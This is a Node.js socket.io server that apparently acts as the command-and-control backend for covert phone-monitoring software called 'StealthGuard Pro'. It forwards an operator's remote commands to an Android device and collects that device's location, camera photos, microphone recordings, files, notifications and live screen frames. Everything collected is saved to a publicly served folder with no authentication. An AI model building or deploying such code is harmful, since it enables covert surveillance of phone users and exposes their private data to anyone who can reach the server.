const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

// --- Server Setup ---
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8
});

let androidSocket = null;
let webSocket = null;

console.log("------------------------------------------");
console.log("   STEALTHGUARD PRO SERVER IS STARTING    ");
console.log("------------------------------------------");

io.on('connection', (socket) => {
    const isWeb = socket.handshake.query.type === 'web';

    if (isWeb) {
        webSocket = socket;
        console.log(`[+] Web GUI Connected!`);
        if (androidSocket) webSocket.emit('device_status', { connected: true });

        socket.on('gui_command', (data) => {
            if (androidSocket) {
                androidSocket.emit('remote_command', data);
            } else {
                socket.emit('server_log', "Error: No phone connected!");
            }
        });

    } else {
        androidSocket = socket;
        console.log(`[+] Android Phone Connected!`);
        if (webSocket) webSocket.emit('device_status', { connected: true });

        socket.on('register_child', (data) => {
            if (webSocket) webSocket.emit('device_info', data);
        });

        socket.on('child_location_update', (data) => {
            if (webSocket) webSocket.emit('location_data', data);
        });

        socket.on('child_photo_taken', (data) => {
            const buffer = Buffer.from(data.image, 'base64');
            fs.writeFileSync('public/captured_photo.jpg', buffer);
            if (webSocket) webSocket.emit('photo_data', { url: 'captured_photo.jpg', timestamp: new Date().getTime() });
        });

        socket.on('child_audio_recorded', (data) => {
            const buffer = Buffer.from(data.audio, 'base64');
            fs.writeFileSync('public/recorded_audio.mp3', buffer);
            if (webSocket) webSocket.emit('audio_data', { url: 'recorded_audio.mp3' });
        });

        socket.on('file_list', (data) => {
            if (webSocket) webSocket.emit('file_list_data', data);
        });

        socket.on('file_data', (data) => {
            if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
            const buffer = Buffer.from(data.file_data, 'base64');
            const safeName = data.file_name.replace(/[^a-z0-9.]/gi, '_');
            fs.writeFileSync(`public/downloads/${safeName}`, buffer);
            if (webSocket) webSocket.emit('download_ready', { url: `downloads/${safeName}`, name: data.file_name });
        });

        socket.on('child_notification', (data) => {
            if (webSocket) webSocket.emit('notification_data', data);
        });

        socket.on('screen_frame', (data) => {
            if (webSocket) webSocket.emit('screen_data', data.image);
        });

        socket.on('error_msg', (msg) => {
            if (webSocket) webSocket.emit('server_log', "Phone Error: " + msg);
        });

        socket.on('disconnect', () => {
            console.log("[-] Android Phone Disconnected!");
            androidSocket = null;
            if (webSocket) webSocket.emit('device_status', { connected: false });
        });
    }

    socket.on('disconnect', () => {
        if (socket === webSocket) {
            webSocket = null;
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server: http://localhost:${PORT}`);
});
